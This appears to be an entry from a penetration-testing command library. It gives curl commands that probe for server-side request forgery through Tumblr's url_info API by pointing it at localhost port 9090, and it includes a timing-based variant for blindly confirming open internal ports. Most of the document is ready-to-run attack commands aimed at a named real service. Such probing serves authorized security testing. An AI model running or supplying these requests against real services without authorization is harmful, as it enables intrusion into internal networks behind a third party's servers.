---
id: cmd-curl-internal-ssrf-001
data: >-
  curl -X GET
  "https://www.tumblr.com/api/v2/url_info?url=http://127.0.0.1:9090/&fields%5Bblogs%5D=avatar%2Cname%2Ctitle%2Curl%2Cdescription_npf%2Ctheme%2Cuuid%2Ccan_be_followed%2C%3Ffollowed%2C%3Fis_member%2Cshare_likes%2Cshare_following%2Ccan_subscribe%2Ccan_message%2Csubscribed%2Cask%2C%3Fcan_submit%2C%3Fis_blocked_from_primary%2C%3Fadvertiser_name%2C%3Ftop_tags%2C%3Fprimary"
  -H "Host: www.tumblr.com" -H "Cookie: your-session-cookie"
tags:
  - ssrf
  - internal
  - localhost
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.722Z'
verified: false
validated: true
submitted: true
---
# curl-internal-ssrf-test

## Command

```bash
curl -X GET "https://www.tumblr.com/api/v2/url_info?url=http://127.0.0.1:9090/&fields%5Bblogs%5D=avatar%2Cname%2Ctitle%2Curl%2Cdescription_npf%2Ctheme%2Cuuid%2Ccan_be_followed%2C%3Ffollowed%2C%3Fis_member%2Cshare_likes%2Cshare_following%2Ccan_subscribe%2Ccan_message%2Csubscribed%2Cask%2C%3Fcan_submit%2C%3Fis_blocked_from_primary%2C%3Fadvertiser_name%2C%3Ftop_tags%2C%3Fprimary" -H "Host: www.tumblr.com" -H "Cookie: your-session-cookie"
```

## Description

Tests internal SSRF by requesting a localhost URL on port 9090, observing response for blind confirmation via status and timing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| `url=http://127.0.0.1:9090/` | Internal target | Yes |
| `-H "Cookie: ..."` | Session auth | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.tumblr.com/api/v2/url_info?url=http://127.0.0.1:9090/" -H "Cookie: session=abc123"
```

### Advanced Usage

With timing measurement:

```bash
(time curl -s "https://www.tumblr.com/api/v2/url_info?url=http://127.0.0.1:9090/" -H "Cookie: session=abc123") 2>&1 | grep real
```

## Expected Output

HTTP 200 OK with minimal JSON; response time >500ms if port open.

## Related

- [[Related Procedure: Test-Internal-SSRF-with-Localhost-URL]]
